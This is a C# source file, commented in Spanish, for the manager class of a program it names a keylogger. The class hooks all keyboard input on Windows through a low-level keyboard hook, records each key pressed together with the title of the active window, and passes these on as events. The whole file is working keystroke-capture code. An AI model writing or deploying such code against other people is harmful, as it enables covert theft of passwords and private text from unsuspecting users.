using System;
using System.Diagnostics;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

namespace KeyLogger
{
	/// <summary>
	///		Manager del keyLogger
	/// </summary>
	internal class KeyLoggerManager : IDisposable
	{
		// Eventos públicos
		internal event EventHandler<KeyLoggerEventArgs> KeyPressed;
		// Id del callback asignado
		private IntPtr _hookID = IntPtr.Zero;

		/// <summary>
		///		Arranca el keyLogger
		/// </summary>
		internal void Start()
		{
			_hookID = SetHook(HookCallback);
		}

		/// <summary>
		///		Asigna el manejador de eventos de teclado
		/// </summary>
		private IntPtr SetHook(WindowsApi.LowLevelKeyboardProc proc)
		{
			using (Process process = Process.GetCurrentProcess())
			{
				using (ProcessModule module = process.MainModule)
				{
					return WindowsApi.SetWindowsHookEx(WindowsApi.WH_KEYBOARD_LL, proc, 
													   WindowsApi.GetModuleHandle(module.ModuleName), 0);
				}
			}
		}

		/// <summary>
		///		Callback de tratamiento de los eventos de teclado
		/// </summary>
		[MethodImpl(MethodImplOptions.NoInlining)]
		private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
		{
			// Si se ha pulsado una tecla lanza el evento de teclado
			if (nCode >= 0 && wParam == (IntPtr) WindowsApi.WM_KEYDOWN)
				KeyPressed?.Invoke(this, new KeyLoggerEventArgs(GetActiveWindowTitle(), 
																Marshal.ReadInt32(lParam)));
			// Pasa al siguiente callback
			return WindowsApi.CallNextHookEx(_hookID, nCode, wParam, lParam);
		}

		/// <summary>
		///		Obtiene el título de la ventana activa
		/// </summary>
		private string GetActiveWindowTitle()
		{
			const int BufferLength = 2000;
			System.Text.StringBuilder buffer = new System.Text.StringBuilder(BufferLength);

				// Devuelve el título de la ventana activa
				if (WindowsApi.GetWindowText(WindowsApi.GetForegroundWindow(), buffer, BufferLength) > 0)
					return buffer.ToString();
				else
					return "No active window";
		}

		/// <summary>
		///		Detiene el KeyLogger
		/// </summary>
		internal void Stop()
		{
			if (_hookID != IntPtr.Zero)
				WindowsApi.UnhookWindowsHookEx(_hookID);
		}

		/// <summary>
		///		Libera la memoria
		/// </summary>
		protected virtual void Dispose(bool disposing)
		{
			if (!Disposed)
			{
				// Detiene el keylogger
				if (disposing)
					Stop();
				// Indica que se ha liberado la memoria
				Disposed = true;
			}
		}

		/// <summary>
		///		Libera memoria
		/// </summary>
		public void Dispose()
		{
			Dispose(true);
		}

		/// <summary>
		///		Indica si se han liberado los recursos
		/// </summary>
		public bool Disposed { get; private set; }
	}
}
